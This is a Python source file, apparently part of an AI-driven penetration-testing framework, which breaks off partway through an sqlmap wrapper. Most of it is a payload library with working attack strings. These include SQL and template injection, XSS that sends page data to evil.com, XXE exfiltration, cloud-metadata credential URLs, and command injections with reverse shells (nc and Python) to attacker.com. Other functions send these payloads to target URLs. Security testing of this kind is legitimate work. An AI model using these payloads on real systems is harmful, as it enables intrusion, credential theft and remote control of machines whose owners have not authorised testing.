import subprocess
import json
import time
import logging
import os
import requests
import urllib.parse
from typing import Dict, List, Any, Optional, Union
from dataclasses import dataclass
from pathlib import Path
import re
import base64
import random
import xml.etree.ElementTree as ET
from urllib.parse import urlparse

from scapy.layers.inet import IP, TCP, UDP, ICMP
import paramiko
import jwt as pyjwt
from zapv2 import ZAPv2

# ===== GLOBAL CONFIGURATION =====
VAPT_CONFIG = {
    'timeout': 30,
    'output_dir': './vapt_results',
    'debug': False,
    'max_threads': 10,
    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# ===== DATA STRUCTURES =====

@dataclass
class ToolCallResult:
    """Standardized result format for all VAPT functions"""
    success: bool
    tool_name: str
    vulnerabilities: List[Union[Dict, 'Vulnerability']] = None
    execution_time: float = 0.0
    error: str = ""
    metadata: Dict[str, Any] = None
    business_impact: str = ""
    cvss_score: float = 0.0
    compliance_risk: str = ""

    def __post_init__(self):
        if self.vulnerabilities is None:
            self.vulnerabilities = []
        if self.metadata is None:
            self.metadata = {}
    
    def get_vulnerabilities_as_dicts(self) -> List[Dict]:
        """Convert all vulnerabilities to dictionaries for serialization"""
        result = []
        for vuln in self.vulnerabilities:
            if isinstance(vuln, Vulnerability):
                result.append(vuln.to_dict())
            else:
                result.append(vuln)  # Already a dict
        return result

@dataclass
class Vulnerability:
    """Standardized vulnerability finding structure"""
    type: str                           # Vulnerability type (e.g., 'SQL Injection', 'XSS')
    severity: str                       # Risk level: Critical, High, Medium, Low, Info
    evidence: str                       # Description of what was found
    cvss_score: float = 0.0            # CVSS score 0-10
    
    # Location details
    location: Optional[str] = None      # Where found (e.g., 'GET parameter', 'POST body')
    parameter: Optional[str] = None     # Parameter name if applicable
    url: Optional[str] = None           # Full URL tested
    endpoint: Optional[str] = None      # API endpoint
    
    # Technical details  
    payload: Optional[str] = None       # Attack payload used
    response_code: Optional[int] = None # HTTP response code
    port: Optional[str] = None          # Network port
    service: Optional[str] = None       # Network service
    target: Optional[str] = None        # Network target
    
    # Tool-specific fields
    tool: Optional[str] = None          # Tool that found it (e.g., 'SQLMap', 'nmap')
    technique: Optional[str] = None     # Attack technique used
    dbms: Optional[str] = None          # Database type for SQL injection
    
    # Advanced metadata
    business_impact: Optional[str] = None    # Business impact description
    remediation: Optional[str] = None        # Fix recommendations
    references: Optional[List[str]] = None   # CVE, CWE references
    
    def __post_init__(self):
        """Validate and normalize fields"""
        # Ensure severity is valid
        valid_severities = ['Critical', 'High', 'Medium', 'Low', 'Info']
        if self.severity not in valid_severities:
            self.severity = 'Medium'
        
        # Ensure CVSS score is within range
        if self.cvss_score < 0:
            self.cvss_score = 0.0
        elif self.cvss_score > 10:
            self.cvss_score = 10.0
            
        # Initialize references list if needed
        if self.references is None:
            self.references = []
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for backward compatibility"""
        result = {}
        for field in self.__dataclass_fields__:
            value = getattr(self, field)
            if value is not None:  # Only include non-None values
                result[field] = value
        return result
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'Vulnerability':
        """Create Vulnerability from dictionary"""
        # Filter out keys that aren't valid fields
        valid_fields = set(cls.__dataclass_fields__.keys())
        filtered_data = {k: v for k, v in data.items() if k in valid_fields}
        return cls(**filtered_data)

# ===== ELITE PAYLOAD LIBRARIES =====

class PayloadLibrary:
    """Comprehensive attack payload collection for expert-level testing"""
    
    SQL_INJECTION = {
        'critical': [
            "' OR '1'='1' --",
            "'; EXEC xp_cmdshell('whoami'); --",
            "' UNION SELECT 1,@@version,user(),database() --",
            "'; WAITFOR DELAY '0:0:5'; --",
            "' AND 1=CONVERT(int,(SELECT @@version)) --",
            "' UNION SELECT null,table_name,null FROM information_schema.tables --"
        ],
        'bypass': [
            "/*!50000UNION*//*!50000SELECT*/",
            "UNI%00ON SEL%00ECT",
            "'/**/OR/**/1=1/**/--",
            "' OR ASCII(SUBSTRING((SELECT database()),1,1))>64 --",
            "%27%20OR%20%271%27=%271"
        ],
        'time_based': [
            "'; IF(1=1) WAITFOR DELAY '0:0:5' --",  # MSSQL
            "' AND (SELECT SLEEP(5)) --",           # MySQL
            "' OR (SELECT pg_sleep(5)) --",         # PostgreSQL
            "'; BENCHMARK(5000000,MD5(1)) --"       # MySQL load-based
        ],
        'error_based': [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e)) --",  # MySQL
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1) --",   # MySQL
            "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT(version(),floor(rand(0)*2))) --"  # MySQL
        ],
        'nosql_injection': [
            "'; return this.username == 'admin' && this.password == 'admin' || '1'=='1' --",
            "{\"$ne\": null}",
            "{\"$regex\": \".*\"}",
            "{\"$where\": \"this.username == this.username\"}"
        ],
        'second_order': [
            "admin'/* comment injection */",
            "test'; INSERT INTO audit_log VALUES('injected'); --"
        ]
    }
    
    XSS_ADVANCED = {
        'critical': [
            "<svg/onload=alert('XSS')>",
            "<img src=x onerror=alert('XSS')>",
            "<script>fetch('/admin').then(r=>r.text()).then(d=>fetch('//evil.com?'+btoa(d)))</script>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<details open ontoggle=alert('XSS')>"
        ],
        'waf_bypass': [
            "<ScRiPt>alert(String.fromCharCode(88,83,83))</ScRiPt>",
            "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
            "jaVasCript:alert('XSS')",
            "<svg><animatetransform onbegin=alert('XSS')>",
            "<iframe src=\"data:text/html,<script>alert('XSS')</script>\">"
        ],
        'csp_bypass': [
            "<link rel=dns-prefetch href=\"//evil.com\">",
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
            "'><script src=\"data:,alert('XSS')\"></script>",
            "<script>import('data:text/javascript,alert(\"XSS\")')</script>"
        ],
        'dom_based': [
            "javascript:void(0)/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",
            "#<script>alert('XSS')</script>",
            "?javascript:alert('XSS')",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;"
        ],
        'framework_bypass': [
            "{{constructor.constructor('alert(\"XSS\")')()}}",  # Angular
            "${alert('XSS')}",  # Template literals
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",  # Unicode
            "<%- alert('XSS') %>",  # EJS
            "{@html alert('XSS')}"  # Svelte
        ],
        'event_handlers': [
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<body onload=alert('XSS')>"
        ],
        'polyglot': [
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert('XSS')//'>",
            "\"><script>alert('XSS')</script><\"",
            "'><script>alert(String.fromCharCode(88,83,83))</script>",
            "\"onclick=alert('XSS')//",
            "</script><script>alert('XSS')</script>"
        ]
    }
    
    XXE_PAYLOADS = [
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>]><root>&xxe;</root>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'>%xxe;]>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]><root>&xxe;</root>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>]><root>&xxe;</root>",
        # Advanced XXE with parameter entities
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % data SYSTEM 'file:///etc/passwd'><!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>\">%param1;]><root>&exfil;</root>",
        # Blind XXE
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://attacker.com/evil.dtd'>%remote;]><root/>",
        # XXE via SVG
        "<?xml version='1.0' standalone='yes'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><svg><text>&xxe;</text></svg>"
    ]
    
    SSRF_TARGETS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://localhost:6379",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/",
        "gopher://127.0.0.1:25/",
        "http://[::1]:80/",
        "http://0177.0.0.1/",
        "http://2130706433/",
        "http://017700000001/",
        # Cloud metadata endpoints
        "http://169.254.169.254/computeMetadata/v1/",  # Google Cloud
        "http://100.100.100.200/latest/meta-data/",     # Alibaba Cloud
        "http://169.254.169.254/metadata/instance",     # Azure
        # Protocol smuggling
        "gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com",
        "dict://127.0.0.1:11211/stats",                 # Memcached
        "sftp://127.0.0.1:22/",
        # Bypass attempts
        "http://0x7f000001/",  # Hex encoding
        "http://2130706433/",  # Decimal encoding
        "http://127.1/",       # Short form
        "http://localhost.evil.com@127.0.0.1/"  # Host confusion
    ]
    
    COMMAND_INJECTION = [
        "; whoami",
        "&& id",
        "| cat /etc/passwd",
        "; uname -a",
        "`whoami`",
        "$(id)",
        "; curl attacker.com/$(whoami)",
        "|nc -e /bin/sh attacker.com 4444",
        ";python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "&ping -c 4 attacker.com",
        "|nslookup attacker.com",
        # Windows-specific
        "& dir",
        "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "; powershell -c \"Get-Process\"",
        "& net user",
        # Evasion techniques
        "; w\\"+"h\\"+"o\\"+"a\\"+"m\\"+"i",  # Backslash evasion
        "; ${PATH:0:1}bin${PATH:0:1}whoami",  # Bash variable expansion
        "; $IFS$()cat$IFS/etc/passwd",       # IFS bypass
        ";\\ \\w\\h\\o\\a\\m\\i",             # Space and backslash evasion
        # Time-based detection
        "; sleep 10",
        "& timeout 10",
        "; ping -c 10 127.0.0.1"
    ]
    
    JWT_ATTACKS = {
        'none_algorithm': '{"alg":"none","typ":"JWT"}',
        'weak_secrets': ['secret', 'key', 'password', '123456', 'admin', 'test', 'jwt', 'token', 
                        'secret123', 'mysecret', 'jwtsecret', 'your-256-bit-secret', 'hmackey'],
        'algorithm_confusion': ['HS256', 'RS256', 'ES256', 'none', 'HS384', 'HS512', 'RS384', 'RS512'],
        'critical_claims': ['admin', 'root', 'superuser', 'administrator', 'iat', 'exp', 'aud', 'iss'],
        'jwt_bombs': [  # For testing JWT parsing vulnerabilities
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.' + 'A' * 10000,  # Oversized payload
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.' + 'B' * 5000
        ]
    }
    
    DIRECTORY_TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "....\/....\/....\/etc/passwd",
        "%252e%252e%252f",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        # Advanced evasions
        "....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts",
        "..%c1%1c..%c1%1c..%c1%1cetc%c1%1cpasswd",
        "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd",
        # Unicode evasions
        "..%u2216..%u2216..%u2216etc%u2216passwd",
        "..\\uFF0E.\\uFF0E.\\etc\\passwd",
        # Double encoding
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
    ]
    
    BUSINESS_LOGIC_PAYLOADS = {
        'price_manipulation': ['-1', '0', '0.01', '999999999', '0.00', '-999999', '∞', 'NaN'],
        'quantity_bypass': ['-1', '0', '999999', 'null', '', '-999999', '2147483648', 'undefined'],
        'workflow_bypass': ['admin', 'true', '1', 'yes', 'approved', 'APPROVED', 'True', 'TRUE'],
        'race_condition_targets': ['/transfer', '/purchase', '/vote', '/apply', '/submit', '/withdraw', '/deposit'],
        'privilege_escalation': ['admin', 'root', 'administrator', 'superuser', 'system', 'sa'],
        'discount_abuse': ['100', '101', '-1', '999', '50.5', 'unlimited', 'MAX_VALUE']
    }

    # NEW ENTERPRISE-GRADE CATEGORIES
    
    DESERIALIZATION_PAYLOADS = {
        'java': [
            # Java deserialization gadgets
            'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7oxAUMAFAA',  # PriorityQueue gadget
            'rO0ABXNyABNqYXZhLnV0aWwuSGFzaHRhYmxlE7s/',  # Hashtable gadget
            'aced0005737200116a6176612e7574696c2e48617368536574',  # HashSet gadget
        ],
        'python': [
            "cos\nsystem\n(S'whoami'\ntR.",  # pickle payload
            "c__builtin__\neval\n(S'__import__(\"os\").system(\"whoami\")'\ntR.",
            "csubprocess\ncall\n(S'whoami'\ntR."
        ],
        'php': [
            'O:8:"stdClass":1:{s:4:"test";s:7:"phpinfo";}',  # PHP object injection
            'a:2:{i:0;s:4:"test";i:1;O:8:"stdClass":0:{}}',  # Array with object
            'O:8:"stdClass":1:{s:4:"func";s:6:"system";}'
        ],
        'dotnet': [
            'AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0sIFZlcnNpb249',  # .NET BinaryFormatter
            '/wEy2g8AAQAAAAAAAAAAAAAAAQEAAAAAXXNvcA=='  # .NET TypeConfuseDelegate
        ]
    }
    
    LDAP_INJECTION = [
        '*)(uid=*))(|(uid=*',
        '*)(|(password=*))',
        '*)(&(password=*))',
        '*))%00',
        '*()|%26\'',
        '*)(&(objectclass=*))',
        '*)(objectClass=*))(&(objectClass=void',
        '*))(|(cn=*))',
        '*)(|(userPassword=*))',
        '*)(&(|(objectclass=*)(objectclass=*))(&(objectclass=*)'
    ]
    
    XPATH_INJECTION = [
        "' or '1'='1",
        "' or 1=1 or '1'='1",
        "x' or 1=1 or 'x'='y",
        "') or '1'='1",
        "' or position()=1 and '1'='1",
        "' or 1=1] | //user[password=''",
        "' and count(/*)=1 and '1'='1",
        "' and string-length(name(/*[1]))>0 and '1'='1"
    ]
    
    TEMPLATE_INJECTION = {
        'jinja2': [
            "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{request.__class__._load_form_data.__globals__['sys'].modules['os'].popen('id').read()}}"
        ],
        'freemarker': [
            "${\"freemarker.template.utility.Execute\"?new()}(\"whoami\")}",
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            "${''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke('').exec('whoami')}"
        ],
        'velocity': [
            "#set($rt = $ex.getRuntime())",
            "#set($proc = $rt.exec('whoami'))",
            "$ex.getRuntime().exec('whoami')"
        ],
        'smarty': [
            "{php}echo shell_exec('whoami');{/php}",
            "{if phpinfo()}{/if}",
            "{php}system('id');{/php}"
        ],
        'twig': [
            "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"whoami\")}}",
            "{{'/etc/passwd'|file_excerpt(1,30)}}",
            "{{['id']|filter('system')}}"
        ]
    }
    
    API_SECURITY_PAYLOADS = {
        'graphql': [
            'query{__schema{types{name}}}',  # Schema introspection
            'query{__type(name:"User"){fields{name type{name}}}}',  # Type introspection
            '{user(id:"1"){...on User{password}}}',  # Field-level access
            'mutation{deleteUser(id:"1"){id}}',  # Unauthorized mutations
        ],
        'rest_api': [
            '{"id":1,"admin":true}',  # Parameter pollution
            '{"$ne": null}',  # NoSQL injection via JSON
            '{"$regex":".*"}',  # Regex injection
            '{"__proto__":{"admin":true}}',  # Prototype pollution
        ],
        'api_versioning': [
            '/api/v1/../admin',  # Path traversal in API routes
            '/api/v0.1/users',  # Old API version access
            '/api/internal/debug',  # Internal API exposure
        ]
    }
    
    CLOUD_SECURITY_PAYLOADS = {
        'aws': [
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data',
            'http://169.254.169.254/latest/meta-data/public-keys/',
            '/proc/self/environ',  # Container escape attempts
        ],
        'azure': [
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://169.254.169.254/metadata/identity/oauth2/token',
            'http://169.254.169.254/metadata/instance/compute/userData',
        ],
        'gcp': [
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            'http://metadata.google.internal/computeMetadata/v1/project/project-id',
            'http://metadata.google.internal/computeMetadata/v1/instance/attributes/',
        ],
        'kubernetes': [
            '/var/run/secrets/kubernetes.io/serviceaccount/token',
            '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
            'https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/pods',
        ]
    }
    
    WAF_BYPASS_TECHNIQUES = {
        'sql_injection': [
            "/*!50000UNION*//*!50000SELECT*/",
            "UNION/**/SELECT",
            "UNI%00ON%20SEL%00ECT",
            "/**/UNION/**/SELECT/**/",
            "UNION(SELECT(1),(2),(3))",
            "+UNION+SELECT+",
            "-'/**/UNION/**/SELECT/**/"
        ],
        'xss': [
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "jaVasCript:alert('XSS')",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<svg><animatetransform onbegin=alert('XSS')>",
            "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"
        ],
        'command_injection': [
            "w\\"+"h\\"+"o\\"+"a\\"+"m\\"+"i",
            "${PATH:0:1}bin${PATH:0:1}whoami",
            "$IFS$()cat$IFS/etc/passwd",
            "\\ \\w\\h\\o\\a\\m\\i"
        ]
    }
    
    ENTERPRISE_COMPLIANCE_TESTS = {
        'pci_dss': [
            # Credit card number patterns for testing
            '4111111111111111',  # Test Visa
            '5555555555554444',  # Test MasterCard
            '378282246310005',   # Test Amex
        ],
        'gdpr_pii': [
            # PII patterns to test for exposure
            'john.doe@example.com',
            '+1-555-123-4567',
            '123-45-6789',  # SSN pattern
            'passport:AB123456',
        ],
        'hipaa_phi': [
            # Healthcare identifiers
            'patient_id:12345',
            'medical_record:MR123456',
            'insurance:INS789012',
        ]
    }
    
    ADVANCED_AUTHENTICATION_BYPASS = {
        'jwt_manipulation': [
            '{"alg":"none","typ":"JWT"}',  # Algorithm none
            '{"alg":"HS256","typ":"JWT","kid":"../../etc/passwd"}',  # Key confusion
            '{"alg":"RS256","typ":"JWT","x5u":"http://attacker.com/cert.pem"}',  # X5U injection
        ],
        'saml_attacks': [
            '<saml:Assertion><saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject></saml:Assertion>',
            # SAML signature wrapping attacks would be complex XML here
        ],
        'oauth_attacks': [
            'response_type=code&redirect_uri=http://attacker.com',  # Redirect manipulation
            'state=../../admin',  # State parameter injection
        ]
    }
    
    MEMORY_CORRUPTION_PATTERNS = {
        'buffer_overflow': [
            'A' * 100,
            'A' * 256,
            'A' * 1000,
            'A' * 4096,
            '\x41' * 1024,  # Hex pattern
        ],
        'format_string': [
            '%x%x%x%x%x%x%x%x',
            '%s%s%s%s%s%s%s%s',
            '%n%n%n%n%n%n%n%n',
            '%08x.' * 10
        ],
        'integer_overflow': [
            '2147483647',   # Max 32-bit signed int
            '4294967295',   # Max 32-bit unsigned int
            '9223372036854775807',  # Max 64-bit signed int
            '-2147483648',  # Min 32-bit signed int
        ]
    }

# ===== UTILITY FUNCTIONS =====

def create_vulnerability(vuln_type: str, severity: str, evidence: str, **kwargs) -> Vulnerability:
   
    # Calculate CVSS score if not provided
    if 'cvss_score' not in kwargs:
        kwargs['cvss_score'] = calculate_cvss_score(vuln_type, severity)
    
    return Vulnerability(
        type=vuln_type,
        severity=severity,
        evidence=evidence,
        **kwargs
    )

def setup_logging(debug: bool = False) -> logging.Logger:
    level = logging.DEBUG if debug else logging.INFO
    logging.basicConfig(
        level=level,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    return logging.getLogger(__name__)

def create_session(proxy: str = None, verify_ssl: bool = False) -> requests.Session:
    session = requests.Session()
    session.verify = verify_ssl
    session.timeout = VAPT_CONFIG['timeout']
    session.headers.update({
        'User-Agent': VAPT_CONFIG['user_agent']
    })
    
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}
    
    return session

def extract_url_from_text(text: str) -> Optional[str]:
    """Extract URL from plan or description text"""
    if not text:
        return None
        
    # URL pattern matching
    url_pattern = r'https?://[^\s<>"\']+|(?:www\.)?[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*'
    matches = re.findall(url_pattern, text)
    
    if matches:
        url = matches[0].strip('\'"[]')
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"
        return url
    return None


def detect_xss_reflection(response_text: str, payload: str) -> bool:
    # Check for direct payload reflection
    if payload in response_text:
        return True
    
    # Check for URL-encoded payload reflection
    encoded_payload = urllib.parse.quote(payload)
    if encoded_payload in response_text:
        return True
    
    # Check for HTML-encoded payload reflection
    html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
    if html_encoded in response_text:
        return True
    
    return False

def calculate_cvss_score(vulnerability_type: str, severity: str) -> float:
    base_scores = {
        'SQL Injection': {'Critical': 9.8, 'High': 8.5, 'Medium': 6.0},
        'XSS': {'Critical': 8.8, 'High': 7.5, 'Medium': 5.5},
        'XXE': {'Critical': 9.1, 'High': 8.0, 'Medium': 6.5},
        'SSRF': {'Critical': 8.5, 'High': 7.0, 'Medium': 5.0},
        'Command Injection': {'Critical': 9.9, 'High': 8.8, 'Medium': 7.0},
        'JWT Vulnerability': {'Critical': 9.1, 'High': 7.5, 'Medium': 5.5},
        'IDOR': {'Critical': 8.5, 'High': 7.0, 'Medium': 5.0},
        'Open Port': {'Critical': 9.0, 'High': 7.5, 'Medium': 5.0},
        'Information Disclosure': {'Critical': 7.5, 'High': 6.0, 'Medium': 4.0}
    }
    
    return base_scores.get(vulnerability_type, {}).get(severity, 0.0)

def save_results(results: ToolCallResult, filename: str = None) -> str:
    try:
        results_dir = Path(VAPT_CONFIG['output_dir'])
        results_dir.mkdir(parents=True, exist_ok=True)
        
        if not filename:
            timestamp = int(time.time())
            filename = f"vapt_results_{timestamp}.json"
        
        filepath = results_dir / filename
        
        # Convert dataclass to dict for JSON serialization
        results_dict = {
            'success': results.success,
            'tool_name': results.tool_name,
            'vulnerabilities': results.get_vulnerabilities_as_dicts(),
            'execution_time': results.execution_time,
            'error': results.error,
            'metadata': results.metadata,
            'business_impact': results.business_impact,
            'cvss_score': results.cvss_score,
            'compliance_risk': results.compliance_risk,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(results_dict, f, indent=2, ensure_ascii=False)
        
        return str(filepath)
        
    except Exception as e:
        logging.error(f"Error saving results: {e}")
        return ""

# ===== SQL INJECTION TESTING FUNCTIONS =====
@dataclass
class PayloadTargetContext:
    framework: Optional[str] = None  # 'django', 'laravel', 'rails', 'express', 'asp.net', etc.
    database: Optional[str] = None   # 'mysql', 'postgresql', 'mssql', 'oracle', 'sqlite'
    web_server: Optional[str] = None # 'nginx', 'apache', 'iis', 'tomcat'
    language: Optional[str] = None   # 'python', 'php', 'java', 'nodejs', 'csharp'
    cms: Optional[str] = None        # 'wordpress', 'drupal', 'joomla'
    supports_post: bool = True       # Whether target supports POST requests
    supports_json: bool = False      # Whether target accepts JSON payloads
    authentication_type: Optional[str] = None  # 'cookie', 'bearer', 'basic'
    has_waf: bool = False           # Whether WAF protection is detected
    payload_encoding: Optional[str] = None     # 'url', 'base64', 'none'
    custom_headers: Optional[Dict[str, str]] = None
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for backward compatibility"""
        result = {}
        for field in self.__dataclass_fields__:
            value = getattr(self, field)
            if value is not None:
                result[field] = value
        return result
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'PayloadTargetContext':
        """Create PayloadTargetContext from dictionary"""
        valid_fields = set(cls.__dataclass_fields__.keys())
        filtered_data = {k: v for k, v in data.items() if k in valid_fields}
        return cls(**filtered_data)

def sql_injection_test(url: str, parameter: str = "id", payloads: List[str] = None, 
                      target_context: Union[PayloadTargetContext, Dict[str, Any]] = None) -> ToolCallResult:
    
    start_time = time.time()
    vulnerabilities = []
    
    try:
        session = create_session()
        
        # Convert target_context to PayloadTargetContext if it's a dict
        if isinstance(target_context, dict):
            target_context = PayloadTargetContext.from_dict(target_context)
        elif target_context is None:
            target_context = PayloadTargetContext()
        
        # Use LLM-provided payloads or smart selection from PayloadLibrary
        if not payloads:
            # Smart payload selection based on target context
            payloads = []
            
            # Add basic critical payloads
            payloads.extend(PayloadLibrary.SQL_INJECTION['critical'][:3])
            
            # Add context-specific payloads
            if target_context.database:
                if target_context.database.lower() == 'mysql':
                    payloads.extend(PayloadLibrary.SQL_INJECTION['error_based'][:2])
                elif target_context.database.lower() in ['mssql', 'sqlserver']:
                    payloads.extend(PayloadLibrary.SQL_INJECTION['time_based'][:1])
                elif target_context.database.lower() == 'postgresql':
                    payloads.extend([PayloadLibrary.SQL_INJECTION['time_based'][2]])
            
            # Add WAF bypass payloads if WAF detected
            if target_context.has_waf:
                payloads.extend(PayloadLibrary.SQL_INJECTION['bypass'][:2])
            
            # Add NoSQL payloads if framework suggests NoSQL usage
            if target_context.framework and 'mongo' in target_context.framework.lower():
                payloads.extend(PayloadLibrary.SQL_INJECTION['nosql_injection'][:2])
            
            # Fallback if no smart selection worked
            if not payloads:
                payloads = [
                    "' OR '1'='1' --",
                    "'; WAITFOR DELAY '0:0:5'; --",
                    "' UNION SELECT 1,@@version --"
                ]
        
        # Extract target context for smart testing
        framework = target_context.framework or 'unknown'
        database_type = target_context.database or 'unknown'
        
        for payload in payloads:
            # Test both GET and POST based on context
            test_methods = ['GET']
            if target_context.supports_post:
                test_methods.append('POST')
            
            for method in test_methods:
                try:
                    if method == 'GET':
                        test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
                        response = session.get(test_url, timeout=15)
                    else:
                        response = session.post(url, data={parameter: payload}, timeout=15)
                    
                    # Enhanced detection with context awareness
                    vuln = _detect_sql_vulnerability(
                        response, url, parameter, payload, method, 
                        framework, database_type
                    )
                    if vuln:
                        vulnerabilities.append(vuln)
                        
                except Exception as e:
                    logging.error(f"Error testing SQL {method} parameter: {e}")
            
            time.sleep(0.2)  # Rate limiting
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="SQL Injection Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'url': url,
                'parameter': parameter,
                'payloads_tested': len(payloads),
                'target_context': target_context.to_dict(),
                'framework': framework,
                'database_type': database_type
            },
            business_impact=_assess_sql_business_impact(vulnerabilities, target_context.to_dict()),
            cvss_score=max([v.cvss_score for v in vulnerabilities if isinstance(v, Vulnerability)] + [0.0]),
            compliance_risk="Data protection and integrity regulations at risk"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="SQL Injection Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

def sqlmap_campaign(url: str, options: Dict[str, Any] = None, 
                   target_context: Union[PayloadTargetContext, Dict[str, Any]] = None,
                   campaign_mode: str = "comprehensive") -> ToolCallResult:
    start_time = time.time()
    vulnerabilities = []
    
    try:
        # Check for sqlmap availability
        current_dir = os.getcwd()
        sqlmap_path = os.path.join(current_dir, 'sqlmap-dev', 'sqlmap.py')
        
        if not os.path.exists(sqlmap_path):
            return ToolCallResult(
                success=False,
                tool_name="SQLMap Campaign",
                error=f"SQLMap not found at {sqlmap_path}",
                execution_time=time.time() - start_time
            )
        
        # Convert target_context to PayloadTargetContext if it's a dict
        if isinstance(target_context, dict):
            target_context = PayloadTargetContext.from_dict(target_context)
        elif target_context is None:
            target_context = PayloadTargetContext()
        
        # Build context-aware SQLMap command
        cmd = ['python', sqlmap_path, '-u', url, '--batch']
        
        # Campaign mode configurations
        campaign_configs = {
            "basic": {
                "level": 1,
                "risk": 1,
                "technique": "BEU",
                "timeout": 30,
                "threads": 3
            },
            "comprehensive": {
                "level": 3,
                "risk": 2,
                "technique": "BEUSTQ",
                "timeout": 60,
                "threads": 5
            },
            "stealth": {
                "level": 5,
                "risk": 1,
                "technique": "B",
                "timeout": 120,
                "threads": 1,
                "delay": 2
            },
            "aggressive": {
                "level": 5,
                "risk": 3,
                "technique": "BEUSTQ",
                "timeout": 30,
                "threads": 10
            }
        }
